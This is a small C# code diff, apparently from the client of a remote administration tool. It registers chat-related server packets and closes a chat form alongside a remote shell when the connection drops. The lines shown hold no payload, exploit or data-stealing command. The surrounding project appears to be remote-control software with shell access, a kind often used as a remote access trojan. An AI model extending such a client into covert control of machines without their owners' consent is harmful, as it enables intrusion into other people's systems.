@@ -72,6 +72,9 @@ namespace xClient.Core.Networking
                 typeof (Packets.ServerPackets.SetAuthenticationSuccess),
                 typeof (Packets.ServerPackets.GetConnections),
                 typeof (Packets.ServerPackets.DoCloseConnection),
+                typeof (Packets.ServerPackets.DoChatStart),
+                typeof (Packets.ServerPackets.DoChatMessage),
+                typeof (Packets.ServerPackets.DoChatStop),
                 typeof (Packets.ClientPackets.GetAuthenticationResponse),
                 typeof (Packets.ClientPackets.SetStatus),
                 typeof (Packets.ClientPackets.SetStatusFileManager),
@@ -179,6 +182,7 @@ namespace xClient.Core.Networking
         private void LostConnection()
         {
             CommandHandler.CloseShell();
+            CommandHandler.CloseChatForm();
         }
 
         public void Exit()
